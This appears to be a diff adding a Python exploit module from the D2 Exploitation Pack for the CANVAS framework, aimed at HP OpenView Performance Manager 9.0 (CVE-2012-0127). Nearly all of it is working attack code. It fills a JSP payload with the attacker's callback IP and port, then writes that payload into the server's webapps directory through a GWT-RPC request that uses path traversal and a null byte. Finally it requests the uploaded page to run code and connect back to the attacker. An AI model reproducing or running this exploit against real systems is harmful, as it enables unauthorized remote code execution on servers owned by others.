@@ -1,0 +1,138 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+import time
+import os
+import random
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "HP OpenView Performance Manager PMParamHandler Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution in HP OpenView Performance Manager"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "HP"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "HP OpenView Performance Manager 9.0"
+DOCUMENTATION["Date public"] = "2012.06.21"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-12-100/"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2012-0127"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0127"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the JAVA node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_hpovpm/d2.jsp"    
+    self.protocol = "http"
+    self.port = 8081
+    self.sslport = 8444
+    self.https = 0
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+	
+  def upload_file(self):  
+    # Open JSP file
+    f = open(self.filename, "r")
+    payload = f.read()
+    f.close()
+    
+    payload = payload.replace("CALLBACK_IP", self.callback.ip)
+    payload = payload.replace("CALLBACK_PORT", str(self.callback.port))  
+    payload = payload.replace("\\", "\\\\")
+                
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+
+    ua = spkproxy.UserAgent("", exploit=self)
+    
+    url = "/OVPM/"
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)    
+    data = ua.GET(mainurl)         
+        
+    # Upload JSP file     
+    name = ''.join(random.choice(string.ascii_lowercase) for x in range(8))
+    filename = "/../../../../../../../../../../Program Files/HP/HP BTO Software/www/webapps/OVPM/%s.jsp\x00"%name
+    params = "5|0|52|http://w2k3usnew:8081/OVPM/html/com.hp.GwtEntry/|049EE1891495B42E623D80EE2D7C11FB|com.hp.perf.client.proxy.IGwtProxy|executeCommand|com.hp.perf.client.request.IClientRequest|com.hp.pm.client.request.ManageGraphRequest/3629737560|" + payload + "|" + filename + "|com.hp.pm.client.request.GraphInfo/2660807090|yyyyyyy|java.util.ArrayList/3821976829|com.hp.pm.client.request.TemplateClsInfo/2402338642|GLOBAL|com.hp.pm.client.request.TemplateMetInfo/292744512|Red|CPU Utilization|GBL_CPU_TOTAL_UTIL|Lime|Peak Disk Utilization|GBL_DISK_UTIL_PEAK|MediumBlue|Swap Space Utilization|GBL_SWAP_SPACE_UTIL|Yellow|Run Queue Length|GBL_RUN_QUEUE|Cyan|Memory Page Out Rate|GBL_MEM_PAGEOUT_RATE|Magenta|Network Input Packet Rate|GBL_NET_IN_PACKET_RATE|Sienna|Network Output Packet Rate|GBL_NET_OUT_PACKET_RATE|Teal|Active Processes|GBL_ACTIVE_PROC|Overall System Performance Summary|PA|xxxxxxx|This graph shows the values of key performance indicators for a system.|Utilization Percent|zzzzzzz|auto|rate per sec / count|java.lang.String/2004016611|W2K3USNEW|Userxxxxxxx|Global History for @@[SYSTEM]| <p>When <b>CPU Utilization</b> nears 100 percent, the system is heavily loaded. If many processes are also waiting in the Run Queue, you may have a CPU bottleneck situation.  An investigation into the applications active on the system is recommended.</p> <p>The <b>Run Queue Length</b> shows the number of programs that are waiting for access to the CPU.  On some systems, the run queue can be high even when the CPU utilization is less than 100 percent, which may be indicative of a disk bottleneck.</p> <p>The <b>Peak Disk Utilization</b> shows how busy the busiest physical disk device is.  If this value is over 50 percent then at least one disk drive on the system may be bottlenecked.</p> <p>Swap Space is used to provide virtual memory to the system, which will be reserved as applications allocate memory.  When <b>Swap Space Utilization</b> nears 100 percent then some programs may fail to execute.</p> <p>The <b>Memory Page Out Rate</b> shows activity paging data from physical memory to the swap space.  High values can be caused by the applications currently running needing to access more memory than is available.  When the system needs to page out resident sets from applications, not only does disk activity increase but programs will be slowed down when they access those pages and they need to be brought back into memory.</p> <p>Network Activity is tracked by the <b>Network Input Packet Rate</b>(packets transferred from the network into the system) and <b>Network Output Packet Rate</b>(packets transferred from the system out to the network), include packets from all network interfaces. The sum of these two is the overall network transfer rate.</p> <p><b>Active Processes</b> is the average number of processes using cpu time on the system.  It does not count programs that are loaded but did not actually run during the measurement sample.</p>|22222|1|2|3|4|1|5|6|3|7|8|9|0|0|-1|-1|-1|-1|-1|0|0|0|0|0|10|0|11|8|12|13|0|11|1|14|0|15|0|0|0|0|0|0|0|0|0|0|0|0|0|0|16|0|0|0|0|2|2|0|17|0|0|0|0|0|12|13|0|11|1|14|0|18|0|0|0|0|0|0|0|0|0|0|0|0|0|0|19|0|0|0|0|2|2|0|20|0|0|0|0|0|12|13|0|11|1|14|0|21|0|0|0|0|0|0|0|0|0|0|0|0|0|0|22|0|0|0|0|2|2|0|23|0|0|0|0|0|12|13|0|11|1|14|1|24|0|0|0|0|0|0|0|0|0|0|0|0|0|0|25|0|0|0|0|2|6|0|26|0|0|0|0|0|12|13|0|11|1|14|1|27|0|0|0|0|0|0|0|0|0|0|0|0|0|0|28|0|0|0|0|2|3|0|29|0|0|0|0|0|12|13|0|11|1|14|1|30|0|0|0|0|0|0|0|0|0|0|0|0|0|0|31|0|0|0|0|2|3|0|32|0|0|0|0|0|12|13|0|11|1|14|1|33|0|0|0|0|0|0|0|0|0|0|0|0|0|0|34|0|0|0|0|2|3|0|35|0|0|0|0|0|12|13|0|11|1|14|1|36|0|0|0|0|0|0|0|0|0|0|0|0|0|0|37|0|0|0|0|2|6|0|38|0|0|0|0|0|39|40|7|0|2|-1|-1|-1|-1|-1|4294967295|-4294967296|4294967295|-4294967296|41|0|0|0|0|0|0|70|0|0|-1|0|-1|0|0|0|-1|0|0|0|42|-1|2|0|0|0|1|1|0|0|100|0|43|0|100|8|8|0|44|0|0|45|-2|0|-1|0|46|100|0|3|0|4294967295|-4294967296|0|0|11|1|47|48|11|0|0|49|0|50|51|0|-1|0|0|52|0|0|0|1|0|0|0|0|0|0|389|948|"    
+    url = "/OVPM/gwt"    
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    ua.addHeader("Content-Type", "text/x-gwt-rpc; charset=utf-8")
+    data = ua.POST(mainurl, params)    
+	
+    # Execute uploaded JSP file
+    url = "/OVPM/%s.jsp"%name
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)    
+    data = ua.GET(mainurl)
+            		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
